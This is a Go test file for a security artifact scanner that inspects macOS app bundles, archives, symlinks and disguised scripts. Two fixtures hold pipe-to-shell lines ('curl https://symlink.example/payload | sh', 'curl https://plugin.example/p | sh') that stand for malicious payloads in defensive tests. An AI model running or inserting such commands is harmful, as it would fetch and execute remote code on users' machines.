package artifact

import (
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestArchiveAppRootResolutionWithManyLongPrefixRoots(t *testing.T) {
	const rootCount = 4096
	commonPrefix := "Payload/" + strings.Repeat("long-common-prefix/", 64)
	bundles := make(map[string]*archiveAppBundle, rootCount)
	entries := make([]string, 0, rootCount)
	for i := 0; i < rootCount; i++ {
		root := fmt.Sprintf("%s%04d.app", commonPrefix, i)
		bundles[root] = &archiveAppBundle{root: root}
		entries = append(entries, root+"/Contents/Resources/config.json")
	}

	for i, name := range entries {
		want := strings.TrimSuffix(name, "/Contents/Resources/config.json")
		if got := archiveAppRootForEntry(name, bundles); got != want {
			t.Fatalf("entry %d resolved to %q, want %q", i, got, want)
		}
	}
}

func TestArchiveAppRootResolutionUsesFirstAppComponent(t *testing.T) {
	outer := "Payload/Outer.app"
	inner := outer + "/Contents/Frameworks/Helper.app"
	discovered := archiveAppBundles([]VirtualEntry{
		{Name: outer + "/Contents/Info.plist"},
		{Name: inner + "/Contents/Info.plist"},
	})
	if len(discovered) != 1 || discovered[0].root != outer {
		t.Fatalf("archive producer roots = %#v, want only first .app root %q", discovered, outer)
	}
	bundles := map[string]*archiveAppBundle{
		outer: {root: outer},
		inner: {root: inner},
	}
	name := inner + "/Contents/MacOS/Helper"

	if got := archiveAppRootForEntry(name, bundles); got != outer {
		t.Fatalf("nested app entry resolved to %q, want producer root %q", got, outer)
	}
	delete(bundles, outer)
	if got := archiveAppRootForEntry(name, bundles); got != "" {
		t.Fatalf("nested app entry fell through to later .app component %q", got)
	}
}

func TestArchiveAppExecutableRequiresUniqueMetadataAndTarget(t *testing.T) {
	const root = "Example.app"
	info := VirtualEntry{Name: root + "/Contents/Info.plist", Data: []byte(appInfoPlist("Run"))}
	target := VirtualEntry{Name: root + "/Contents/MacOS/Run", Data: []byte("#!/bin/sh\necho inert\n"), Executable: true}
	for _, test := range []struct {
		name  string
		extra VirtualEntry
	}{
		{name: "duplicate metadata", extra: info},
		{name: "conflicting metadata", extra: VirtualEntry{Name: info.Name, Data: []byte(appInfoPlist("Other"))}},
		{name: "metadata case alias", extra: VirtualEntry{Name: root + "/Contents/info.plist", Data: info.Data}},
		{name: "bundle root metadata case alias", extra: VirtualEntry{Name: "example.app/Contents/Info.plist", Data: info.Data}},
		{name: "bundle root target case alias", extra: VirtualEntry{Name: "example.app/Contents/MacOS/Run", Data: target.Data, Executable: true}},
		{name: "duplicate target", extra: target},
		{name: "target case alias", extra: VirtualEntry{Name: root + "/Contents/MacOS/run", Data: target.Data, Executable: true}},
		{name: "target symlink alias", extra: VirtualEntry{Name: target.Name, Symlink: true}},
		{name: "skipped target alias", extra: VirtualEntry{Name: target.Name, SkipDetail: "inert unavailable member"}},
	} {
		t.Run(test.name, func(t *testing.T) {
			entries := []VirtualEntry{info, target, test.extra}
			s := scanner{options: Options{}.normalized()}
			parentID := s.graph.AddNode(Node{LogicalPath: "sample.zip", Kind: "zip"})
			s.addVirtualEntries(parentID, "sample.zip", entries, 1)
			if artifactHasEdgeKind(s.graph.Edges, "bundle-executable") {
				t.Fatalf("ambiguous app members created an executable edge: %#v", s.graph.Edges)
			}
			app := artifactNodeByLogical(s.graph.Nodes, "sample.zip!"+root)
			if app == nil || app.AnalyzeStatus != "partial" || !strings.Contains(app.CoverageDetail, "app executable was not resolved") {
				t.Fatalf("unresolved app selection must be visible in coverage: %#v", app)
			}
			if contentByLogical(s.contents, "sample.zip!"+target.Name) == nil {
				t.Fatal("ambiguous executable bytes should remain available for ordinary analysis")
			}
		})
	}

	s := scanner{options: Options{}.normalized()}
	parentID := s.graph.AddNode(Node{LogicalPath: "sample.zip", Kind: "zip"})
	s.addVirtualEntries(parentID, "sample.zip", []VirtualEntry{info, target}, 1)
	if !artifactHasEdgeToLogical(s.graph, "bundle-executable", "sample.zip!"+target.Name) {
		t.Fatalf("unique app metadata and target lost their executable edge: %#v", s.graph.Edges)
	}
}

func TestAppBundleExecutableDoesNotRewriteExplicitDeclaration(t *testing.T) {
	for _, test := range []struct {
		name  string
		plist string
	}{
		{name: "missing target", plist: appInfoPlist("Missing")},
		{name: "path-valued target", plist: appInfoPlist("../Run")},
		{name: "whitespace is literal", plist: appInfoPlist(" Run ")},
		{name: "non-string target", plist: `<plist><dict><key>CFBundleExecutable</key><integer>123</integer></dict></plist>`},
		{name: "malformed metadata", plist: `not a plist`},
	} {
		t.Run(test.name, func(t *testing.T) {
			app := filepath.Join(t.TempDir(), "Example.app")
			macos := filepath.Join(app, "Contents", "MacOS")
			executable := "Run"
			if test.name == "non-string target" {
				executable = "123"
			}
			if err := os.MkdirAll(macos, 0o700); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(test.plist), 0o600); err != nil {
				t.Fatal(err)
			}
			// The sole unrelated executable must not replace an explicit target.
			if err := os.WriteFile(filepath.Join(macos, executable), []byte("#!/bin/sh\necho inert\n"), 0o755); err != nil {
				t.Fatal(err)
			}
			result, err := InspectPath(app, Options{})
			if err != nil {
				t.Fatal(err)
			}
			if artifactHasEdgeKind(result.Graph.Edges, "bundle-executable") {
				t.Fatalf("invalid declaration selected a different executable: %#v", result.Graph.Edges)
			}
			root := artifactNodeByLogical(result.Graph.Nodes, "Example.app")
			if root == nil || root.AnalyzeStatus != "partial" || !strings.Contains(root.CoverageDetail, "app executable was not resolved") {
				t.Fatalf("unresolved declaration must remain visible: %#v", root)
			}

			entries := []VirtualEntry{
				{Name: "Example.app/Contents/Info.plist", Data: []byte(test.plist)},
				{Name: "Example.app/Contents/MacOS/" + executable, Data: []byte("#!/bin/sh\necho inert\n"), Executable: true},
			}
			s := scanner{options: Options{}.normalized()}
			parentID := s.graph.AddNode(Node{LogicalPath: "sample.zip", Kind: "zip"})
			s.addVirtualEntries(parentID, "sample.zip", entries, 1)
			if artifactHasEdgeKind(s.graph.Edges, "bundle-executable") {
				t.Fatalf("invalid archived declaration selected a different executable: %#v", s.graph.Edges)
			}
			root = artifactNodeByLogical(s.graph.Nodes, "sample.zip!Example.app")
			if root == nil || root.AnalyzeStatus != "partial" || !strings.Contains(root.CoverageDetail, "app executable was not resolved") {
				t.Fatalf("unresolved archived declaration must remain visible: %#v", root)
			}
		})
	}
}

func TestAppBundleExecutablePreservesLiteralWhitespaceAndMissingKeyFallback(t *testing.T) {
	for _, test := range []struct {
		name       string
		plist      string
		executable string
	}{
		{name: "literal whitespace", plist: appInfoPlist(" Run "), executable: " Run "},
		{name: "absent key fallback", plist: `<plist><dict/></plist>`, executable: "Run"},
	} {
		t.Run(test.name, func(t *testing.T) {
			app := filepath.Join(t.TempDir(), "Example.app")
			macos := filepath.Join(app, "Contents", "MacOS")
			if err := os.MkdirAll(macos, 0o700); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(test.plist), 0o600); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(macos, test.executable), []byte("#!/bin/sh\necho inert\n"), 0o755); err != nil {
				t.Fatal(err)
			}
			result, err := InspectPath(app, Options{})
			if err != nil {
				t.Fatal(err)
			}
			logical := "Example.app/Contents/MacOS/" + test.executable
			if !artifactHasEdgeToLogical(result.Graph, "bundle-executable", logical) {
				t.Fatalf("supported executable selection was lost: %#v", result.Graph.Edges)
			}
			entries := []VirtualEntry{
				{Name: "Example.app/Contents/Info.plist", Data: []byte(test.plist)},
				{Name: logical, Data: []byte("#!/bin/sh\necho inert\n"), Executable: true},
			}
			s := scanner{options: Options{}.normalized()}
			parentID := s.graph.AddNode(Node{LogicalPath: "sample.zip", Kind: "zip"})
			s.addVirtualEntries(parentID, "sample.zip", entries, 1)
			if !artifactHasEdgeToLogical(s.graph, "bundle-executable", "sample.zip!"+logical) {
				t.Fatalf("supported archived executable selection was lost: %#v", s.graph.Edges)
			}
		})
	}
}

func TestAppBundleSymlinkInfoPlistIsNotFollowed(t *testing.T) {
	dir := t.TempDir()
	app := filepath.Join(dir, "Example.app")
	if err := os.MkdirAll(filepath.Join(app, "Contents"), 0o700); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(dir, "outside.plist")
	if err := os.WriteFile(target, []byte(appInfoPlist("Run")), 0o600); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(app, "Contents", "Info.plist")
	if err := os.Symlink(target, link); err != nil {
		t.Skipf("symlink unavailable: %v", err)
	}

	result, err := InspectPath(app, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if result.Graph.Nodes[0].Kind == "app-bundle" {
		t.Fatalf("symlinked Info.plist should not classify as an app bundle: %#v", result.Graph.Nodes[0])
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "Example.app/Contents/Info.plist")
	if node == nil || node.Kind != "symlink" || node.AnalyzeStatus != "skipped" {
		t.Fatalf("symlinked Info.plist should be a skipped symlink node: %#v", node)
	}
	if contentByLogical(result.Contents, "Example.app/Contents/Info.plist") != nil {
		t.Fatal("symlinked Info.plist target should not be queued for extraction")
	}
}

func TestAppBundleSymlinkExecutableIsNotPromoted(t *testing.T) {
	dir := t.TempDir()
	app := filepath.Join(dir, "Example.app")
	if err := os.MkdirAll(filepath.Join(app, "Contents", "MacOS"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(appInfoPlist("Run")), 0o600); err != nil {
		t.Fatal(err)
	}
	target := filepath.Join(dir, "outside-run")
	if err := os.WriteFile(target, []byte("#!/bin/sh\ncurl https://symlink.example/payload | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, filepath.Join(app, "Contents", "MacOS", "Run")); err != nil {
		t.Skipf("symlink unavailable: %v", err)
	}

	result, err := InspectPath(app, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if result.Graph.Nodes[0].Kind != "app-bundle" {
		t.Fatalf("regular Info.plist should classify as an app bundle: %#v", result.Graph.Nodes[0])
	}
	if artifactHasEdgeKind(result.Graph.Edges, "bundle-executable") {
		t.Fatalf("symlinked executable should not be promoted as bundle-executable: %#v", result.Graph.Edges)
	}
	if contentByLogical(result.Contents, "Example.app/Contents/MacOS/Run") != nil {
		t.Fatal("symlinked executable target should not be queued for extraction")
	}
}

func TestAppBundlePromotesNestedAppExecutableAsHelper(t *testing.T) {
	dir := t.TempDir()
	app := filepath.Join(dir, "Example.app")
	if err := os.MkdirAll(filepath.Join(app, "Contents", "MacOS"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(appInfoPlist("Run")), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "Contents", "MacOS", "Run"), []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	helper := filepath.Join(app, "Contents", "Frameworks", "Example Helper.app", "Contents", "MacOS", "Example Helper")
	if err := os.MkdirAll(filepath.Dir(helper), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(helper, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	result, err := InspectPath(app, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if !artifactHasEdgeToLogical(result.Graph, "bundle-executable", "Example.app/Contents/MacOS/Run") {
		t.Fatalf("main executable edge missing: %#v", result.Graph.Edges)
	}
	if !artifactHasEdgeToLogical(result.Graph, "bundle-helper", "Example.app/Contents/Frameworks/Example Helper.app/Contents/MacOS/Example Helper") {
		t.Fatalf("nested helper executable edge missing: %#v", result.Graph.Edges)
	}
}

func TestAppBundleRetainsCompiledAppleScriptResource(t *testing.T) {
	dir := t.TempDir()
	app := filepath.Join(dir, "Scripted.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	scripts := filepath.Join(app, "Contents", "Resources", "Scripts")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(scripts, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(appInfoPlist("Run")), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Run"), []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	compiled := append([]byte(compiledAppleScriptMagic+" 1.101.10"), 0, 4, 15, 0xff, 0xff)
	if err := os.WriteFile(filepath.Join(scripts, "main.scpt"), compiled, 0o600); err != nil {
		t.Fatal(err)
	}

	result, err := InspectPath(app, Options{})
	if err != nil {
		t.Fatal(err)
	}
	logical := "Scripted.app/Contents/Resources/Scripts/main.scpt"
	node := artifactNodeByLogical(result.Graph.Nodes, logical)
	if node == nil || node.Kind != "compiled-applescript" || node.MediaType != "application/x-apple-compiled-applescript" || node.AnalyzeStatus != "analyzed" {
		t.Fatalf("compiled AppleScript app resource was not retained and typed: %#v", node)
	}
	content := contentByLogical(result.Contents, logical)
	if content == nil || content.Kind != "compiled-applescript" || !bytes.Equal(content.Data, compiled) {
		t.Fatalf("compiled AppleScript app content was not retained: %#v", content)
	}
	if node.SourceRole != "runtime" || content.Role != "runtime" {
		t.Fatalf("compiled AppleScript app resource should be runtime content: node=%#v content=%#v", node, content)
	}
}

func TestScanAppBundleDoesNotRescanPriorSiblingNodes(t *testing.T) {
	dir := t.TempDir()
	app := filepath.Join(dir, "Example.app")
	if err := os.MkdirAll(filepath.Join(app, "Contents", "MacOS"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(appInfoPlist("Run")), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "Contents", "MacOS", "Run"), []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	s := scanner{options: Options{}.normalized()}
	priorID := s.graph.AddNode(Node{
		LogicalPath:   "Example.app/Contents/Frameworks/Stale.xpc/Contents/MacOS/Stale",
		Kind:          "executable",
		AnalyzeStatus: "analyzed",
	})
	appID := s.graph.AddNode(Node{LogicalPath: "Example.app", Kind: "app-bundle", AnalyzeStatus: "analyzed"})

	s.scanAppBundle(app, "Example.app", appID)

	for _, edge := range s.graph.Edges {
		if edge.From == appID && edge.To == priorID {
			t.Fatalf("current bundle linked a node retained from prior sibling work: %#v", edge)
		}
	}
}

func TestAppBundleExecutableSkipsOversizedInfoPlist(t *testing.T) {
	dir := t.TempDir()
	app := filepath.Join(dir, "Example.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	info := append(bytes.Repeat([]byte(" "), int(maxAppMetadataBytes)+1), []byte(appInfoPlist("Run"))...)
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), info, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Run"), []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Other"), []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	result, err := InspectPath(app, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if artifactHasEdgeKind(result.Graph.Edges, "bundle-executable") {
		t.Fatalf("oversized Info.plist should not be parsed to promote an executable: %#v", result.Graph.Edges)
	}
}

func TestPlatypusScriptEntrypointRequiresBoundedSettings(t *testing.T) {
	dir := t.TempDir()
	app := filepath.Join(dir, "Scripted.app")
	resources := filepath.Join(app, "Contents", "Resources")
	if err := os.MkdirAll(resources, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(appInfoPlist("Run")), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(resources, "script"), []byte("echo ok\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	settings := filepath.Join(resources, "AppSettings.plist")
	validSettings := validPlatypusSettingsPlist
	if err := os.WriteFile(settings, []byte(validSettings), 0o600); err != nil {
		t.Fatal(err)
	}
	if got := platypusScriptEntrypoint(app); got != filepath.Join(resources, "script") {
		t.Fatalf("platypusScriptEntrypoint() = %q", got)
	}
	if err := os.WriteFile(settings, []byte("bplist00Platypus-5.3\x00ScriptInterpreter\x00/bin/sh"), 0o600); err != nil {
		t.Fatal(err)
	}
	if got := platypusScriptEntrypoint(app); got != "" {
		t.Fatalf("malformed AppSettings.plist should not be promoted: %q", got)
	}
	oversized := append(bytes.Repeat([]byte(" "), int(maxAppMetadataBytes)+1), []byte("Platypus")...)
	if err := os.WriteFile(settings, oversized, 0o600); err != nil {
		t.Fatal(err)
	}
	if got := platypusScriptEntrypoint(app); got != "" {
		t.Fatalf("oversized AppSettings.plist should not be read or promoted: %q", got)
	}
}

func TestAppBundleExecutableIgnoresNestedExecutableTemplate(t *testing.T) {
	dir := t.TempDir()
	app := filepath.Join(dir, "Example.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	info := `<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
  <key>CFBundleIdentifier</key>
  <string>com.example.metadata</string>
  <key>Template</key>
  <dict>
    <key>CFBundleExecutable</key>
    <string>Helper</string>
  </dict>
</dict>
</plist>
`
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(info), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Helper"), []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Other"), []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	result, err := InspectPath(app, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if artifactHasEdgeKind(result.Graph.Edges, "bundle-executable") {
		t.Fatalf("nested CFBundleExecutable should not select the main executable: %#v", result.Graph.Edges)
	}
}

func TestAppBundleExecutableRejectsPathComponents(t *testing.T) {
	dir := t.TempDir()
	app := filepath.Join(dir, "Example.app")
	if err := os.MkdirAll(filepath.Join(app, "Contents", "MacOS"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(appInfoPlist("../../Outside")), 0o600); err != nil {
		t.Fatal(err)
	}
	outside := filepath.Join(app, "Contents", "Outside")
	if err := os.WriteFile(outside, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	result, err := InspectPath(app, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if artifactHasEdgeKind(result.Graph.Edges, "bundle-executable") {
		t.Fatalf("path-valued CFBundleExecutable escaped Contents/MacOS: %#v", result.Graph.Edges)
	}
	if contentByLogical(result.Contents, "Example.app/Contents/Outside") == nil {
		t.Fatal("fixture should still be inspected as an ordinary executable")
	}
}

func TestSafeAppExecutableNameRequiresOnePlainBasename(t *testing.T) {
	for _, value := range []string{"Run", "Example Helper", "name.with-dots", "name:variant"} {
		if got, ok := safeAppExecutableName(value); !ok || got != value {
			t.Errorf("safeAppExecutableName(%q) = %q, %v", value, got, ok)
		}
	}
	for _, value := range []string{"", ".", "..", "../Run", "subdir/Run", `subdir\Run`, "/Run", "bad\nname"} {
		if got, ok := safeAppExecutableName(value); ok {
			t.Errorf("safeAppExecutableName(%q) unexpectedly accepted %q", value, got)
		}
	}
}

func TestAppBundleDirectoryDepthLimitSkipsDeeperResources(t *testing.T) {
	dir := t.TempDir()
	app := filepath.Join(dir, "Example.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	deepDir := filepath.Join(app, "Contents", "Resources", "one", "two")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(deepDir, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(appInfoPlist("Run")), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Run"), []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(deepDir, "hidden.sh"), []byte("echo hidden\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	result, err := InspectPath(app, Options{MaxDirectoryDepth: 2})
	if err != nil {
		t.Fatal(err)
	}
	if contentByLogical(result.Contents, "Example.app/Contents/Resources/one/two/hidden.sh") != nil {
		t.Fatalf("resource beyond app directory depth should not be queued: %#v", result.Contents)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "Example.app/Contents/Resources/one/two")
	if node == nil || node.Kind != "directory" || node.AnalyzeStatus != "skipped" {
		t.Fatalf("deep app resource directory should be represented as skipped: %#v", node)
	}
	if !strings.Contains(node.CoverageDetail, "directory depth limit 2 reached") {
		t.Fatalf("skipped app directory should explain depth limit: %#v", node)
	}
	if !strings.Contains(strings.Join(result.Diagnostics, "\n"), "Example.app/Contents/Resources/one/two: directory depth limit 2 reached") {
		t.Fatalf("missing app depth diagnostic: %#v", result.Diagnostics)
	}
}

func TestAppBundleReportsSkippedHeavyResourceDirectory(t *testing.T) {
	dir := t.TempDir()
	app := filepath.Join(dir, "Example.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	pluginDir := filepath.Join(app, "Contents", "Resources", "plugins")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(pluginDir, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(appInfoPlist("Run")), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Run"), []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(pluginDir, "install.sh"), []byte("curl https://plugin.example/p | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	result, err := InspectPath(app, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if contentByLogical(result.Contents, "Example.app/Contents/Resources/plugins/install.sh") != nil {
		t.Fatalf("heavy resource directory should not be analyzed by default: %#v", result.Contents)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "Example.app/Contents/Resources/plugins")
	if node == nil || node.Kind != "directory" || node.AnalyzeStatus != "skipped" {
		t.Fatalf("heavy resource directory should be represented as skipped: %#v", node)
	}
	if !strings.Contains(node.CoverageDetail, "use --include-unreferenced") {
		t.Fatalf("skipped heavy directory should mention --include-unreferenced: %#v", node)
	}
	if !strings.Contains(strings.Join(result.Diagnostics, "\n"), "Example.app/Contents/Resources/plugins: large app resource directory skipped") {
		t.Fatalf("missing heavy directory diagnostic: %#v", result.Diagnostics)
	}

	deepResult, err := InspectPath(app, Options{IncludeUnreferenced: true})
	if err != nil {
		t.Fatal(err)
	}
	if contentByLogical(deepResult.Contents, "Example.app/Contents/Resources/plugins/install.sh") == nil {
		t.Fatalf("--include-unreferenced should inspect plugin resource script: %#v", deepResult.Contents)
	}
}

func TestAppBundleInspectsCanonicalASARByDefault(t *testing.T) {
	dir := t.TempDir()
	app := filepath.Join(dir, "Example.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	resources := filepath.Join(app, "Contents", "Resources")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(resources, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(appInfoPlist("Run")), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Run"), []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	appASAR, err := writeTestAsar(map[string][]byte{
		"main.js": []byte(`fetch("https://app-asar.example/api")`),
	})
	if err != nil {
		t.Fatal(err)
	}
	extraASAR, err := writeTestAsar(map[string][]byte{
		"extra.js": []byte(`fetch("https://extra-asar.example/api")`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(resources, "app.asar"), appASAR, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(resources, "extra.asar"), extraASAR, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(resources, "renderer.js"), []byte("console.log('renderer')\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	result, err := InspectPath(app, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if contentByLogical(result.Contents, "Example.app/Contents/Resources/app.asar") == nil {
		t.Fatalf("canonical app.asar should be inspected by default: %#v", result.Contents)
	}
	if contentByLogical(result.Contents, "Example.app/Contents/Resources/app.asar!main.js") == nil {
		t.Fatalf("canonical app.asar members should be expanded by default: %#v", result.Contents)
	}
	for _, logical := range []string{
		"Example.app/Contents/Resources/extra.asar",
		"Example.app/Contents/Resources/extra.asar!extra.js",
		"Example.app/Contents/Resources/renderer.js",
	} {
		if contentByLogical(result.Contents, logical) != nil {
			t.Fatalf("unrelated low-priority app content %q should still require --include-unreferenced: %#v", logical, result.Contents)
		}
	}
}

func TestAppBundleDetectsCompiledAppleScriptBehindResourceSuffix(t *testing.T) {
	dir := t.TempDir()
	app := filepath.Join(dir, "OSAMinerStyle.app")
	resources := filepath.Join(app, "Contents", "Resources")
	if err := os.MkdirAll(resources, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(appInfoPlist("MissingCarrier")), 0o600); err != nil {
		t.Fatal(err)
	}
	payload := append([]byte("FasdUAS"), 0x00, 0xff, 0x01, 0x02)
	if err := os.WriteFile(filepath.Join(resources, "stage.png"), payload, 0o600); err != nil {
		t.Fatal(err)
	}

	result, err := InspectPath(app, Options{})
	if err != nil {
		t.Fatal(err)
	}
	content := contentByLogical(result.Contents, "OSAMinerStyle.app/Contents/Resources/stage.png")
	if content == nil || content.Kind != "compiled-applescript" || content.MediaType != "application/x-apple-compiled-applescript" {
		t.Fatalf("disguised compiled AppleScript was not retained and content-typed: %#v", content)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "OSAMinerStyle.app/Contents/Resources/stage.png")
	if node == nil || node.Kind != "compiled-applescript" {
		t.Fatalf("disguised compiled AppleScript graph node = %#v", node)
	}
}

func TestAppBundleDetectsShebangScriptBehindResourceSuffix(t *testing.T) {
	dir := t.TempDir()
	app := filepath.Join(dir, "ScriptFacade.app")
	resources := filepath.Join(app, "Contents", "Resources")
	if err := os.MkdirAll(resources, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(appInfoPlist("MissingCarrier")), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(resources, "stage.png"), []byte("#!/bin/sh\necho facade\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	result, err := InspectPath(app, Options{})
	if err != nil {
		t.Fatal(err)
	}
	content := contentByLogical(result.Contents, "ScriptFacade.app/Contents/Resources/stage.png")
	if content == nil || content.Kind != "script" || content.MediaType != "text/plain" {
		t.Fatalf("disguised shebang script was not retained and content-typed: %#v", content)
	}
}

func appInfoPlist(executable string) string {
	return `<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key>
  <string>` + executable + `</string>
</dict>
</plist>
`
}

func artifactNodeByLogical(nodes []Node, logical string) *Node {
	for i := range nodes {
		if nodes[i].LogicalPath == logical {
			return &nodes[i]
		}
	}
	return nil
}

func contentByLogical(contents []Content, logical string) *Content {
	for i := range contents {
		if contents[i].LogicalPath == logical {
			return &contents[i]
		}
	}
	return nil
}

func artifactHasEdgeKind(edges []Edge, kind string) bool {
	for _, edge := range edges {
		if edge.Kind == kind {
			return true
		}
	}
	return false
}

func artifactHasEdgeToLogical(graph Graph, kind, logical string) bool {
	nodes := map[string]Node{}
	for _, node := range graph.Nodes {
		nodes[node.ID] = node
	}
	for _, edge := range graph.Edges {
		if edge.Kind == kind && nodes[edge.To].LogicalPath == logical {
			return true
		}
	}
	return false
}
